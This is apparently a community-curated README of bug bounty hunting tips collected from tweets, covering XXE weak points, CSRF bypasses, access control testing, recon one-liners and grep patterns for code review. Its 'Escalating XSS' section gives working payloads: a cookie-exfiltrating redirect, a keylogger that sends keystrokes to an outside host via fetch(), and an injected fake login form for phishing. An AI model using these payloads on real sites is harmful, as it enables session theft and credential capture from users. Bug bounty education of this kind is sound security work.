# Bugcrowd Tip Jar 💡

A curated collection of one-off bug bounty wisdom nuggets to help you level up. 🚀

![header](bc-tipjar-min.png)

# How to Contribute 🙌

Post your hacking tips on socials with the hashtag #bugcrowdtipjar and/or make a PR to this repository!

# The Tips! 💡

## Common XXE Weakpoints

Source: https://twitter.com/Bugcrowd/status/1342184648856616972

```
XXE's are still quite common, and they're usually a P1! 
Here are places that you can look for them:

1. Uploading Open XML documents such as MS Offics docs (docx, xlsx, pptx). They're all just zip files filled with XML files. If these documents get parsed on the server-side, there's a chance that they will also parse external entities within those files.

2. Functionality that parses RSS feeds (they're XML too!)

3. Functionality that parses HTML (for example, converting HTML to PDF)

4.  Functionality that parses sitemap.xml files.

5. SAML requests.

6. Content-Type with application/json can also be replaced with application/xml. Many parsers support that.

7. SVG files (if they get parsed in some way on the server)
```

## Escalating XSS

Source: https://twitter.com/Bugcrowd/status/1339417608169222145

```
Here are a few ways to make the most of an XSS.

1. Grab the victim's cookies by redirecting to an attacker's server and appending the cookie value, e.g. document.location='bugcrowd.com/?'+document.cookie

2. Perform a sensitive action as the victim user (such as changing their password or email address). Having an XSS allows you to bypass SOP and Anti-CSRF mechanisms. See here for some payloads + inspiration: https://github.com/hakluke/weaponised-XSS-payloads

3. Plant a JavaScript keylogger (from https://github.com/swisskyrepo/PayloadsAllTheThings)
<img src=x onerror='document.onkeypress=function(e){fetch("http://bugcrowd.com/?k="+String.fromCharCode(e.which))},this.remove();'>

4. Redress the window with a fake HTML login form to phish credentials: document.body.innerHTML = "<form action='https://bugcrowd.com'><input type='text' value='email' name='email'><input type='password' value='password' name='password'><input type='submit'></form>"
```

## Motion vs. Action

Source: https://twitter.com/DanielMiessler/status/1296641221696172032

```
"The difference between motion and action. 
Motion:

-talk to a personal trainer
-research your book idea
-explore different types of meditation

Action:

-do 10 squats
-write 1 sentence
-meditate for 1 minute

Motion feels like progress. Action is progress."

– James Clear, Atomic Habits
```

## Find Leaky Password Reset Tokens

Source: https://twitter.com/hakluke/status/1300392121065594881

```
Try this when testing webapps:

1. Set up burp in browser1
2. Do a password reset request in browser1
3. Open the password reset email in browser2 and copy the token
4. Search your Burp history for the token, if it is there, you've got yourself a nice easy account takeover!
```

## Quick Way to Generate a Custom Wordlist

Source: https://twitter.com/hakluke/status/1301487471704776705

```
Easily generate a custom wordlist from any domain:

echo "http://bugcrowd.com" | subfinder -silent | hakrawler -plain -usewayback -scope yolo | sed $'s/[:./?=:]/\\\n/g' | anew
```

## Logic Bugs

Source: https://twitter.com/hakluke/status/1308365970780561408

```
Here's a solid bug bounty tip. If you are going to focus on one vulnerability class, make it logic bugs. Most of the P1 bugs I see pop up are logic errors that developers have made. They often have high impact and they can't be discovered through automation.

To find them you need to start by fully understanding the purpose of the application that you are attacking. Try to think about what the developer would have been thinking when they implemented each feature, then switch back to your hacker brain, where might they have made a mistake?
```

## Long-Term Collaborator

Source: https://twitter.com/stokfredrik/status/1314940154478501888

```
Hacky af long term burp collaborator with slack notifications. 
1. Run collaborator and tee output into a file
2. Bash loop the file for changes.
3. Negative grep out stuff you don’t want like ns|www|mail and Smash that slack webhook with the data.
Yaaay long term monitoring...
```

## Wordlists from JHaddix

Source: https://twitter.com/Jhaddix/status/1315755608851668993

```
Just FYI my content discovery file is:

https://gist.github.com/jhaddix/b80ea67d85c13206125806f0828f4d10

My subdomain enumeration file is:

https://gist.github.com/jhaddix/f64c97d0863a78454e44c2f7119c2a6a

My github dork section of http://hunter.sh is:

https://gist.github.com/jhaddix/77253cea49bf4bd4bfd5d384a37ce7a4

Enjoy!
```

## Paradigms for Long-term Success in Bounties

Source: https://twitter.com/0xpatrik/status/1326867341263728640

```
There are multiple paradigms for long-time success in bug bounty:

1. Bug class specialisation / new research
2. Being faster than anyone else / Detection techniques
3. Looking at different targets / Recon
4 ...

All of these, however, revolve around the word "unique".
```

## 10 Tips For Crushing Bug Bounties

Source: https://twitter.com/hakluke/status/1319382749019475969

```
Video: https://www.youtube.com/watch?v=s-baVDolDpI&lc=UgykSV4QCpdsO_MFZU94AaABAg&ab_channel=hakluke

Contents:
1. Persistence
2. Automation
3. Quality Educational Resources(Pentesterlab, The web application hacker's handbook)
4. Collaboration
5. Community
6. Health
7. Know the basics
8. Do what you're good at
9. Hack where there's less competition
10. Just Start
```

## Most Frequently Used Hacking Tools

Source: https://twitter.com/hakluke/status/1328656781195689984

```
This thread is filled with great tool suggestions from a lot of great hackers. Some of the most common are:

- Burp Suite
- ffuf
- nmap
- curl
- nuclei
```

## Recon via Google Analytics Codes

Source: https://twitter.com/hakluke/status/1330470167881469952

```
You can use this website to discover targets that use a particular Google Analytics code. This is a great way of discovering assets owned by a company.

1. Enter the domain or GA code into the website
2. Get results!

https://dnslytics.com/reverse-analytics
```

## Dump Scopes From All Programs Directly to CLI

Source: https://twitter.com/sw33tLie/status/1334936005057654784

```
Check out "bbscope" by sw33tlie: https://github.com/sw33tLie/bbscope
```

## Finding Access Control Bugs

Source: https://twitter.com/hakluke/status/1339209648813981696

```
I've been finding a lot of access control bugs lately! Here's how.

Firstly I have two users, one with high privileges (admin), and one with low privileges (joe). I log in as the admin first, and use all the functionality. Whenever I do something that should be reserved for an administrator, I send the request over to Repeater. Once I have a stack of them, I get the cookies from the "joe" account and insert them into those requests. I send them and analyse the difference in response to see if it worked. If it did, I report it!

Then, I do the same thing but without any cookies or session tokens to see if it works unauthenticated.

You would be amazed at how many applications appear totally secure, and then there's just one or two endpoints that are vulnerable. This is because many web frameworks kind of suck at implementing roles and permissions. Web frameworks have been very successful at lessening the amount of injection vulnerabilities we see, but permissions still need to be defined by a human, so they're more prone to errors.

By the way - if you want to make this whole process 100x faster, check out the "Autorize" burp plugin. @Regala_ and @stokfredrik did a great video about it here: https://www.youtube.com/watch?v=3K1-a7dnA60&ab_channel=ST%C3%96K
```

## Building = Deep Knowledge

Source: https://twitter.com/hakluke/status/1345384372820611073

```
Sometimes, the best way to learn how to hack something is to build it first.
```

## Port Forwarding using Socat

Source: https://twitter.com/mubix/status/1347385031673704454

```
Forward port 80 on your host, to an IP / port on another:
socat TCP-LISTEN:80,fork TCP:192.168.1.100:80

Forward port 80 on your host, to an IP / port on another OVER a SOCKS proxy:
socat tcp-listen:80,fork SOCKS4:127.0.0.1:192.168.1.100:80,socksport=9050
```

## Private Keys -> Private Repositories

Source: https://twitter.com/hakluke/status/1350021538142015490

```
If you ever find a SSH private key in a bounty program's assets, try using it to access the target's private Github repositories.

More details: https://docs.github.com/en/github/authenticating-to-github/connecting-to-github-with-ssh
```

## Finding the Correct Region for an S3 Bucket

Sournce: https://twitter.com/hakluke/status/1350553428242493440

```
If you find a S3 subdomain takeover, you need to set up the S3 bucket in the correct region, otherwise it doesn't work.

To find the region, use `dig` to get the IP address, then put the IP into https://isitonaws.com to grab the region easily.
```

## CSRF Techniques

Source: https://twitter.com/hakluke/status/1350710129671344128

```
CSRF comes in many forms. Try:

- Removing the token parameter entirely
- Setting the token to a blank string
- Changing the token to an invalid token of the same format
- Using a different user's token
- Put the parameters in the URL instead of POST body (and remove the token) and change the HTTP verb to GET
- Testing every sensitive endpoint
- Check whether the token might be guessed / cracked
- Check whether new tokens are generated for every session, if not they may be a hash of something simple like the user's email address. If so you can craft your own valid tokens.
- Try building the payload with multiple methods including a standard HTML form, multipart form, and XHR (Burp can help)

Being thorough is the key - many devs are still implementing CSRF protections on a per-endpoint basis. When they do that, they're bound to forget somewhere!
```

## More complex = Less Secure

Source: https://twitter.com/Bugcrowd/status/1352126283505922049

```
When hunting for bugs, look for features that are complex. As a rule of thumb:

More complex = less secure.
```

## Grep for Code Analysis

Source: https://twitter.com/Bugcrowd/status/1349525327811231745

```
If you're hunting for low-hanging bugs in source code, grep and regex can help you to identify hotspots. For example, you might find basic rXSS in PHP with something like this:

grep -r "echo.*\$_\(GET\|REQUEST\|POST\)" .

Or to uncover potential SQL injection you could try:

grep -r "SELECT.*\\.\\ \\$" .

It will still take some manual work, but this can be a good way to focus your attention on the most obvious weak points.

To take this technique to the next level, checkout gf by tomnomnom: https://github.com/tomnomnom/gf.

For some more tasty regex ideas, checkout the [Trufflehog regexes](https://github.com/dxa4481/truffleHogRegexes/blob/master/truffleHogRegexes/regexes.json).
```

## Wordpress Plugins

Source: https://twitter.com/Bugcrowd/status/1347015120287916032

```
Found a Wordpress site? The easiest place to find bugs is in the plugins.

1. Find the installed plugins with WPScan
2. Set up your own WP instance and install the same plugins
3. Hack your own instance
4. Report your bugs!

The most common bug you'll find with this method is XSS
```
